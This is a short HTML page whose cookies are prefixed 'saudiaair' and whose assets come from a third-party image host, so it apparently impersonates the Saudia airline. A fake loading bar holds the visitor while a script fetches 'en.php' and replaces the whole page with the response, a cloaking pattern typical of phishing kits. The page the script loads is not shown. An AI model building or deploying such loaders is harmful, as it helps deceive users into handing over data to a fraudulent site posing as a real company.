<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport"
        content="maximum-scale=1.0, minimum-scale=1.0, user-scalable=0, initial-scale=1.0, width=device-width" />
    <meta name="referrer" content="always">
    <title>...</title>
    <link rel="stylesheet" href="res/css/theme.css">
</head>

<body translate="no">
    <div class="loader"></div>
    <div class="process"></div>
    <script>
        function sc(name, value) {
            name = "saudiaair" + name;
            var Days = 30;
            var exp = new Date();
            exp.setTime(exp.getTime() + (Days * 20 * 1000));
            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
        }
        function gc(name) {
            name = "saudiaair" + name;
            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
            if (arr = document.cookie.match(reg)) {
                return unescape(arr[2]);
            }
            return '';
        }
        (function () {
            var process = document.documentElement.querySelector(".process");
            window.loaded = false;
            var lod = !!gc("lod");
            function go(e, v) {
                if (!window.loaded) {
                    e.innerText = v + "%";
                    if (v < 90) {
                        setTimeout(go, 30, e, v + 1);
                    } else if (v < 99) {
                        setTimeout(go, 1000, e, v + 1);
                    } else {
                        location.reload();
                    }
                }

            }
            if (!lod) {
                go(process, 1);
            }
        })();
    </script>
    <div style="display:none">

        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.1/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.0/css/select2.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
        <link rel="stylesheet" href="https://u.img.social/res/69198285/css/style.css">
        <!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>-->
        <!--<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.1/js/bootstrap.min.js"></script>-->
        <!--<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.6.12/sweetalert2.all.min.js"></script>-->
        <!--<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>-->
        <img src="https://u.img.social/res/69198285/img/shahuzuo.jpg">
        <img src="https://u.img.social/res/69198285/img/shaeyou.jpg">
        <img src="https://u.img.social/res/69198285/img/sasasa-show.jpg">

    </div>
    <script src="https://u.img.social/res/base64.min.js"></script>
    <script>
        (function () {

            function getData(url, callback) {
                var request = new XMLHttpRequest();
                request.open('get', url, true);
                request.send();
                request.onreadystatechange = function () {
                    if (request.readyState === 4 && request.status === 200) {
                        callback(request.responseText);
                    }
                };
            }

            getData("en.php", function (resp) {
                sc("lod", 1);
                // var content = Base64.decode(resp);
                window.loaded = true;
                var new_doc = document.open("text/html", "replace");
                new_doc.write(resp);
                new_doc.close();
            });
        })();
    </script>
</body>

</html>